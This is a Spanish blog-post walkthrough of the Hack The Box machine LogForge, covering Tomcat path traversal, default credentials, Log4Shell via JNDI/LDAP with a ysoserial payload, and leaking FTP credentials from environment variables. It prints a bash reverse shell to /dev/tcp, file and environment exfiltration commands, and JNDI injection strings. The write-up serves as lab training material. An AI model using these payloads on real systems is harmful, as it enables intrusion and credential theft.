---
layout: post
title: LogForge
date: 2023-02-06
description:
img:
fig-caption:
tags: [eJPT (Intrusión), OSCP, eWPTXv2 (Escalada)]
---
___

<center><img src="/writeups/assets/img/LogForge-htb/LogForge_banner.png" alt="" style="height: 394px; width:520px;"></center>

***

# Conocimientos

* Abuso de URI Normalization

* Explotación Log4Shell

* Serialización de datos

* Decompilación de JAR con JDGUI

* Análisis de tráfico con WireShark

***

# Reconocimiento

## Escaneo de puertos con nmap

### Descubrimiento de puertos abiertos

```null
nmap -p- --open --min-rate 5000 -n -Pn -sS 10.10.11.138 -oG openports
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-07 14:15 GMT
Nmap scan report for 10.10.11.138
Host is up (0.32s latency).
Not shown: 65531 closed tcp ports (reset), 2 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 19.03 seconds
```

### Escaneo de versión y servicios de cada puerto

```null
nmap -sCV -p22,80 10.10.11.138 -oN portscan
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-07 14:16 GMT
Nmap scan report for 10.10.11.138
Host is up (0.61s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 ea8421a3224a7df9b525517983a4f5f2 (RSA)
|   256 b8399ef488beaa01732d10fb447f8461 (ECDSA)
|_  256 2221e9f485908745161f733641ee3b32 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Ultimate Hacking Championship
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.55 seconds
```

## Puerto 80 (HTTP)

Con whatweb, analizo las tecnologías que está empleando el servidor web

```null
whatweb http://10.10.11.138
http://10.10.11.138 [200 OK] Apache[2.4.41], Cookies[JSESSIONID], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], HttpOnly[JSESSIONID], IP[10.10.11.138], Java, Title[Ultimate Hacking Championship]
```

La página principal se ve así:

<img src="/writeups/assets/img/LogForge-htb/1.png" alt="">

Aplico fuzzing para descubrir rutas

```null
gobuster dir -u http://10.10.11.138/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 40
===============================================================
Gobuster v3.4
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.11.138/
[+] Method:                  GET
[+] Threads:                 40
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.4
[+] Timeout:                 10s
===============================================================
2023/02/07 14:30:51 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 302) [Size: 0] [--> /images/]
/admin                (Status: 403) [Size: 277]
/manager              (Status: 403) [Size: 277]
```

Al introducir una ruta que no existe, aparece una versión del Tomcat. Sin embargo, el escaneo del nmap reportaba un Apache. Esto se debe a que se está utilizando el Apache como Reverse Proxy

<img src="/writeups/assets/img/LogForge-htb/2.png" alt="">

Esta versión es vulneable a Directory Path Traversal

<img src="/writeups/assets/img/LogForge-htb/3.png" alt="">

La ruta típica de cualquier Tomcat, es /manager/html, así que abuso de está vulnerabilidad para poder llegar a ella

<img src="/writeups/assets/img/LogForge-htb/4.png" alt="">

Me pide autenticación, así que pruebo con las credenciales por defecto (tomcat:tomcat)

Como se utiliza por detrás la librería Log4j, pruebo a efectuar un Log4shell. Me intento conectar a mi equipo por un puerto a modo de traza

<img src="/writeups/assets/img/LogForge-htb/5.png" alt="">

Y recibo la petición

```null
nc -nlvp 1389
listening on [any] 1389 ...
connect to [10.10.16.3] from (UNKNOWN) [10.10.11.138] 45408
0
 ` 
```

Clono el repositorio [JNDI-Exploit-Kit](https://github.com/pimps/JNDI-Exploit-Kit) y el [ysoserial-modified]() de Github

```null
git clone https://github.com/pimps/JNDI-Exploit-Kit
git clone https://github.com/pimps/ysoserial-modified.git
```

Esta última me sirve para crear un payload serializado que interprete Log4j. En este caso, solo va a funcionar el CommonsCollections5. Para poder ejecutarlo sin problemas, hay que utilizar JAVA11

```null
java -jar ysoserial-modified.jar CommonsCollections5 bash "bash -i >& /dev/tcp/10.10.16.3/443 0>&1" > payload.ser
```

Monto el servicio LDAP con JNDI-Exploit-Kit

```null
java -jar JNDI-Exploit-Kit-1.0-SNAPSHOT-all.jar -L 0.0.0.0:1389 -P /opt/ysoserial-modified/target/payload.ser
```

Ejecuto el payload para la versión 1.7, en mi caso ```${jndi:ldap://10.10.16.3:1389/vv2wyv}```

Y gano acceso al sistema

```null
nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.3] from (UNKNOWN) [10.10.11.138] 45736
bash: cannot set terminal process group (787): Inappropriate ioctl for device
bash: no job control in this shell
tomcat@LogForge:/var/lib/tomcat9$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
tomcat@LogForge:/var/lib/tomcat9$ ^Z
zsh: suspended  nc -nlvp 443
❯ stty raw -echo; fg
[1]  + continued  nc -nlvp 443
                              reset xterm
tomcat@LogForge:/var/lib/tomcat9$ export TERM=xterm
tomcat@LogForge:/var/lib/tomcat9$ export SHELL=bash
tomcat@LogForge:/var/lib/tomcat9$ stty rows 55 columns 209
```

Puedo visualizar la primera flag

```null
tomcat@LogForge:/home/htb$ cat user.txt 
f0ac86e03388c348046f0b41b2d97e0e
```

# Escalada

El usuario root está ejecutando un binario de Java

```null
root         766  0.0  0.0   5568  2768 ?        Ss   13:57   0:00 /usr/sbin/cron -f
root         980  0.0  0.0   7248  3456 ?        S    13:58   0:00  \_ /usr/sbin/CRON -f
root         988  0.0  0.0   2608   612 ?        Ss   13:58   0:00      \_ /bin/sh -c /root/run.sh
root         989  0.0  0.0   5648  3144 ?        S    13:58   0:00          \_ /bin/bash /root/run.sh
root         990  0.1  1.8 3576972 76344 ?       Sl   13:58   0:10              \_ java -jar /root/ftpServer-1.0-SNAPSHOT-all.jar
```

En la raíz del sistema, parece que hay una copia de ese archivo. Me lo traigo a mi equipo para analizarlo con JDGUI

```null
tomcat@LogForge:/$ ls
bin  boot  cdrom  dev  etc  ftpServer-1.0-SNAPSHOT-all.jar  home  lib  lib32  lib64  libx32  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var

tomcat@LogForge:/$ cat < ftpServer-1.0-SNAPSHOT-all.jar > /dev/tcp/10.10.16.3/443
```

En mi equipo decompilo el binario

```null
nc -nlvp 443 > ftpServer-1.0-SNAPSHOT-all.jar
listening on [any] 443 ...
connect to [10.10.16.3] from (UNKNOWN) [10.10.11.138] 45922

jd-gui ftpServer-1.0-SNAPSHOT-all.jar
```

Encuentro credenciales para el FTP, pero en texto claro, si no que las está extrayendo de las variables de entorno del usuario root

<img src="/writeups/assets/img/LogForge-htb/6.png" alt="">

Es vulnerable también al log4shell. Pruebo a enviarme todas las variables de entorno a mi equipo, pero no recibo nada

```null
java -jar ysoserial-modified.jar CommonsCollections5 bash 'env | base64 -w 0 > /dev/tcp/10.10.16.3/443' > ftp.ser
```

La única manera es introduciéndolas en la petición por GET al LDAP

```null
tomcat@LogForge:/tmp$ ftp localhost
Connected to localhost.
220 Welcome to the FTP-Server
Name (localhost:tomcat): ${jndi:ldap://10.10.16.3:389/${env:ftp_user}}
530 Not logged in
```

Para no verlo serializado, puedo abrir Wireshark y analizar el tráfico

<img src="/writeups/assets/img/LogForge-htb/7.png" alt="">

Al seguir el flujo TCP se se puede ver el nombre del usuario

<img src="/writeups/assets/img/LogForge-htb/8.png" alt="">

Hago lo mismo para la contraseña

```null
tomcat@LogForge:/var/lib/tomcat9$ ftp localhost
Connected to localhost.
220 Welcome to the FTP-Server
Name (localhost:tomcat): ${jndi:ldap://10.10.16.3:389/${env:ftp_password}}    
530 Not logged in
```

<img src="/writeups/assets/img/LogForge-htb/9.png" alt="">

Ahora si me conecto con esas credenciales puedo ver la segunda flag

```null
tomcat@LogForge:/tmp$ ftp localhost
Connected to localhost.
220 Welcome to the FTP-Server
Name (localhost:tomcat): ippsec
331 User name okay, need password
Password:
230-Welcome to HKUST
230 User logged in successfully
Remote system type is FTP.
ftp> dir
200 Command OK
125 Opening ASCII mode data connection for file list.
.profile
.ssh
snap
ftpServer-1.0-SNAPSHOT-all.jar
.bashrc
.selected_editor
run.sh
.lesshst
.bash_history
root.txt
.viminfo
.cache
226 Transfer complete.
ftp> get root.txt
local: root.txt remote: root.txt
200 Command OK
150 Opening ASCII mode data connection for requested file root.txt
WARNING! 1 bare linefeeds received in ASCII mode
File may not have transferred correctly.
226 File transfer successful. Closing data connection.
33 bytes received in 0.00 secs (91.5527 kB/s)
ftp> exit
221 Closing connection
tomcat@LogForge:/tmp$ cat root.txt
dfc0fff65c6a97a3df32a234b4368a5f
```